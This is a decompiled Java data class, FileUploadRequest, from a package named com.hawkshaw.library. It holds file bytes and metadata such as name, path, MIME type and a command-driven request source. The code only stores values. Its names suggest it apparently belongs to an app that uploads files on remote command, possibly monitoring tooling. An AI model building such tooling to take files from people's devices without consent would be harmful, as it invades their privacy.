package com.hawkshaw.library.datalayer.models;

import Y1.K;
import com.hawkshaw.library.datalayer.models.Command;

public final class FileUploadRequest {
    private final File file;
    private final MetaData metadata;

    public static final class File {
        private final byte[] content;

        public File(byte[] bArr) {
            K.n(bArr, "content");
            this.content = bArr;
        }

        public final byte[] getContent() {
            return this.content;
        }
    }

    public static final class MetaData {
        private final String mime;
        private final String name;
        private final String path;
        private final Command.FileRequest.Source source;

        public MetaData(String str, String str2, String str3, Command.FileRequest.Source source2) {
            K.n(str, "name");
            K.n(str2, "path");
            K.n(str3, "mime");
            K.n(source2, "source");
            this.name = str;
            this.path = str2;
            this.mime = str3;
            this.source = source2;
        }

        public final String getMime() {
            return this.mime;
        }

        public final String getName() {
            return this.name;
        }

        public final String getPath() {
            return this.path;
        }

        public final Command.FileRequest.Source getSource() {
            return this.source;
        }
    }

    public FileUploadRequest(MetaData metaData, File file2) {
        this.metadata = metaData;
        this.file = file2;
        if (metaData == null && file2 == null) {
            throw new IllegalStateException("Both MetaData and File cannot be null in FileUploadRequest");
        }
    }

    public final File getFile() {
        return this.file;
    }

    public final MetaData getMetadata() {
        return this.metadata;
    }
}
